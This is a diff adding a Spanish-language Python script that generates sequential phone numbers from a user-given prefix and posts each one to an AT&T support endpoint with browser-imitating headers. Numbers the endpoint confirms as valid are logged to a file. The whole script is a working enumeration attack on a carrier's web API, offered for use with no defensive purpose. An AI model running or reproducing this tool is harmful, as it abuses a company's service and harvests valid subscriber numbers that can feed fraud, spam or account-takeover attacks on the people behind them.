@@ -1,0 +1,69 @@
+import requests
+import random
+import string
+import subprocess
+from time import sleep
+
+s = requests.Session()
+
+
+print("""..:::GENERADOR DE NUMEROS AT&T:::..""")
+
+
+headers = {
+    'messageid': '',
+    'enterprisemessageid': '',
+    'origin': 'https://www.att.com/es-us',
+    'accept-encoding': 'gzip, deflate, br',
+    'consumerid': 'webApp',
+    'accept-language': 'es-ES,es;q=0.9',
+    'cookie': 'check=false; TLTSID=; bm_sv=',
+    'applicationid': 'ECMW',
+    'applicationuserid': 'ECMW',
+    'user-agent': '',
+    'content-type': 'application/json;charset=UTF-8',
+    'accept': 'application/javascript, text/javascript */*',
+    'conversationid': '',
+    'referer': 'https://signin.att.com/static',
+    'authority': 'www.att.com',
+    'messagedatetimestamp': '',
+}
+def generate():
+
+    for x in range(9999):
+        digits.append(secuencia+str(x).zfill(4))
+
+
+
+def check(number):
+
+
+    data = '{"ptn":"'+number+'"}'
+
+
+    response = s.post('https://www.att.com/support/smallbusiness/contact-us/security-data-backup', headers=headers,
+                             data=data)
+    if "Success" in response.text:
+        print("~~~~~~~~~~~~~~~")
+        print("~NUMERO VALIDO~")
+        print("~~~~~~~~~~~~~~~")      
+        print(number)
+
+        with open("SprintValidos.txt", "a") as text_file:
+            text_file.write(number+"\n")
+    else:
+        print("Buscando numero valido")
+        
+        
+
+digits = []
+secuencia = input("Porfavor, ingrese su secuencia: ")
+
+generate()
+for x in range(9999):
+    try:
+        check(str(digits[x]))
+        sleep(1)
+    except:
+     print("......")
+    
